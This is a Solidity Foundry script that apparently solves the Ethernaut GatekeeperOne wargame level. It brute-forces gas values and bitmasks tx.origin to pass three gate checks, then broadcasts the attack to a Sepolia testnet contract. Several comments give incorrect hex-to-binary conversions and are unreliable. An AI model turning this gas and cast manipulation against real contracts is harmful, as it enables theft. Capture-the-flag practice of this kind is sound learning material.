// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level13GatekeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: Make it past the gatekeeper and register as an entrant to pass this level.

contract Player {
    function attack(address targetAddress) public {
        bytes8 gateKey = makeGateKey(tx.origin);

        // to pass gateTwo: gasleft() % 8191 == 0
        for (uint i = 0; i < 300; i++) {
            uint256 totalgas = i + (8191 * 5);
            (bool result, ) = targetAddress.call{gas: totalgas}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );

            if (result) {
                break;
            }
        }
    }

    // input: 0x B1 B2 B3 B4 B5 B6 B7 B8
    // 1 byte = 8 bits
    // Requirements for gateThree:
    //    - uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
    //    - uint32(uint64(_gateKey)) != uint64(_gateKey)
    //    - uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
    //
    // Req #1: B5 and B6 must be zeros
    // Req #2: B1 B2 B3 B4 must NOT all be zeros or we can keep the first 4 bytes of tx.origin
    // Req #3: B7 and B8 must be equal to the last 2 bytes of tx.origin
    //
    // Bitmasking to create the gateKey:
    // Bitwise AND operator:
    // 1 & 0 = 0
    // 1 & 1 = 1
    // 0 & 0 = 0
    // 0 & 1 = 0
    //
    // F in hex is 11 in binary
    // FF FF FF FF is 1111 1111 1111 1111
    // 0xFFFFFFFF0000FFFF is 1111 1111 1111 1111 0000 0000 1111 1111
    // this means that the first 4 bytes are not changed, the next 2 bytes are set to zero, and the last 2 bytes are not changed.

    // Solition 1:
    function makeGateKey(address origin) public pure returns (bytes8) {
        return bytes8(uint64(uint160(origin))) & 0xFFFFFFFF0000FFFF;
    }

    // Solition 2:
    // function makeGateKey(address origin) public pure returns (bytes8) {
    //     uint16 low16 = uint16(uint160(origin));
    //     uint64 key = (uint64(0x10000000) << 32) | low16;
    //     return bytes8(key);
    // }
}

contract Level13Solution is Script {
    GatekeeperOne public gatekeeperOne =
        GatekeeperOne(0xa9007743b141E1f49260cd2633C64749df490774);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Entrant address before:", gatekeeperOne.entrant());
        new Player().attack(address(gatekeeperOne));
        console.log("Entrant address after:", gatekeeperOne.entrant());

        vm.stopBroadcast();
    }
}
// forge script script/Level13Solution.s.sol:Level13Solution --broadcast -vv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
